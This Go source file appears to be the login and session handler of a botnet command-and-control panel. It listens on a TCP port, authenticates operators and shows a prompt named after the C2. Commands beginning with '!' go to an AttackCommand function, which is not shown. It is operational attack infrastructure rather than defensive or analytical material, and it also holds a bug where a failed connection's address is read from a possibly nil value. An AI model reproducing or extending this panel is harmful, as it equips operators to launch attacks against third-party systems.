package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"strconv"
	"time"
)

func StartServer() {
	server, err := net.Listen("tcp", net.JoinHostPort(Settings.Server.Address, strconv.Itoa(Settings.Server.Port)))
	if err != nil {
		log.Fatalf("[ERROR] Could not start the server. Error: %s\n", err.Error())
	}

	log.Printf("[INFO] Server started listening on port: %d\n", Settings.Server.Port)

	for {
		conn, err := server.Accept()
		if err != nil {
			log.Printf("[ERROR] Could not accept connection from IP: %s. Error: %s\n",
				conn.RemoteAddr().String(), err.Error())
			continue
		}

		go HandleConnection(conn)
	}
}

func HandleConnection(c net.Conn) {
	var (
		username, password  string
		authMessage, prompt string
		command             string
		user                *User
		err                 error
		ok                  bool
	)

	session := Session{
		ConnectedAt:   time.Now().Unix(),
		RemoteAddress: c.RemoteAddr().String(),
		Reader:        bufio.NewReader(c),
		Conn:          c,
	}

	// Resizing the window so it can support every command.
	ok = session.Resize()
	if !ok {
		return
	}

	if !session.ChangeTitle("Welcome to the login page.") {
		return
	}

	session.ClearScreen()

	session.Write("\x1b[91mThe screen has been resized automatically.\r\nResizing it manually may lead to some UI glitches.\r\n\r\n")

	err = session.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	if err != nil {
		log.Printf("[ERROR] Failed to set a read deadline for: %s. Error: %s\n", session.RemoteAddress, err.Error())
		return
	}

	username, ok = session.WriteAndReceive("\x1b[92musername\x1b[97m:\x1b[97m ")
	if !ok {
		return
	}

	err = session.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	if err != nil {
		log.Printf("[ERROR] Failed to set a read deadline for: %s. Error: %s\n", session.RemoteAddress, err.Error())
		return
	}

	password, ok = session.WriteAndReceive("\u001B[92mpassword\x1b[97m:\x1b[30m ")
	if !ok {
		return
	}

	authMessage, user = AuthenticateUser(session.RemoteAddress, username, password)
	if user == nil {
		session.Disconnect("\x1b[97m" + authMessage)
		return
	}

	ok = true
	ActiveSessions.Range(func(key interface{}, value interface{}) bool {
		aSession := value.(Session)
		if aSession.Username == username {
			session.Disconnect("\x1b[97mYou can only have 1 active session at a time.")
			ok = false
			return false
		}

		return true
	})

	if !ok {
		return
	}

	session.User = *user
	session.Username = username

	ActiveSessions.Store(username, session)

	go session.LiveTitle()

	prompt = fmt.Sprintf("\x1b[92m%s\x1b[97m@\x1b[92m%s\x1b[97m$\x1b[97m ", username, Settings.Server.C2name)
	session.ClearScreen()
	for {
		err = session.Conn.SetReadDeadline(time.Now().Add(10 * time.Minute))
		if err != nil {
			log.Printf("[ERROR] Failed to set a read deadline for: %s. Error: %s\n", session.RemoteAddress, err.Error())
			break
		}

		command, ok = session.WriteAndReceive(prompt)
		if !ok {
			break
		}

		if len(command) == 0 {
			continue
		}

		if command[0] != '!' {
			session.HandleCommand(command)
		} else {
			session.Write(AttackCommand(command, session) + "\r\n")
		}
	}

	session.Disconnect("error occurred.")
}
